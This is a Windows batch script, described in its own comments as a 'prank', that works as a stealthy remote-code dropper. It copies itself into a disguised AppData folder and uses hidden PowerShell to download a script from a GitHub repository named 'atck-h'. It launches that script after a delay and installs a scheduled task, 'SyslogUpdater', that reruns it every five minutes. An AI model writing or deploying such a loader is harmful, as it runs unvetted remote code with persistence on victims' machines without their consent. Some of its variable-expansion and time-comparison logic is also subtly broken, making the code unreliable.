@echo off
setlocal enabledelayedexpansion

:: ===================================================================
:: CONFIGURATION – change these values as needed
:: ===================================================================
set "DELAY=600"                     & REM seconds before first run (600 = 10 min)
set "UPDATER_INTERVAL=5"             & REM minutes between updater runs

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "FIRSTRUN_FLAG=%BASE%\firstrun.txt"
set "LOG_FILE=%BASE%\debug.log"

if not exist "%BASE%" mkdir "%BASE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" goto RUN

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"

        :: Store target time as a **ticks** value (locale‑independent)
        for /f "usebackq delims=" %%a in (`powershell -Command "(Get-Date).AddSeconds(%DELAY%).Ticks"`) do set "TARGET_TICKS=%%a"
        echo %TARGET_TICKS% > "%FIRSTRUN_FLAG%"
        echo [%DATE% %TIME%] First install – target ticks: %TARGET_TICKS% >> "%LOG_FILE%"
    )
)

:RUN
:: If this is a first run (flag exists), check whether the target time has been reached
if exist "%FIRSTRUN_FLAG%" (
    set /p TARGET_TICKS=<"%FIRSTRUN_FLAG%"
    :: Compare current ticks with stored ticks using PowerShell
    powershell -Command "$now = [DateTime]::UtcNow.Ticks; if ($now -ge %TARGET_TICKS%) { exit 0 } else { exit 1 }"
    if !errorlevel! equ 0 (
        start "" "%PRANK%"
        del "%FIRSTRUN_FLAG%"
        echo [%DATE% %TIME%] Prank started, flag deleted >> "%LOG_FILE%"
    ) else (
        echo [%DATE% %TIME%] Target time not yet reached >> "%LOG_FILE%"
    )
)

:: Create / update the scheduled task to run this updater every UPDATER_INTERVAL minutes
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %UPDATER_INTERVAL% /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [%DATE% %TIME%] Scheduled task created/updated successfully >> "%LOG_FILE%"
) else (
    echo [%DATE% %TIME%] Failed to create scheduled task >> "%LOG_FILE%"
)

endlocal